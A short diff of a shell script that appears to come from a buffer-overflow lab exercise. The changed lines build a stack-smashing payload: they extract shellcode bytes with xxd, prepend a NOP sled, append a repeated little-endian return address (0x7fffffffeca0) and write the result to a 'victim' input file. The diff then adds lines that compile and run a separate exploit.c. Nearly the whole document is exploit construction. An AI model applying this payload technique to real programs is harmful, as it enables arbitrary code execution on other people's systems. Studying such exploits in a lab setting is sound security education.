@@ -10,8 +10,12 @@
 #echo $((0xa5-0x78))
 
 #create the input
+# xxd -s0x78 -l48 -c100 -p shellcode shellcode_hex
+
+# a=`printf %016x 0x7fffffffeca0 | tac -rs..`
+
+# (python3 -c 'print("90"*24)'; cat shellcode_hex; echo $a; echo $a; echo $a; echo $a) | xxd -r -p > input_to_victim.txt
+
 xxd -s0x78 -l48 -c100 -p shellcode shellcode_hex
-
-a=`printf %016x 0x7fffffffeca0 | tac -rs..`
-
-(python3 -c 'print("90"*24)'; cat shellcode_hex; echo $a; echo $a; echo $a; echo $a) | xxd -r -p > input_to_victim.txt
+gcc exploit.c -o exploit
+./exploit 80 -32 20
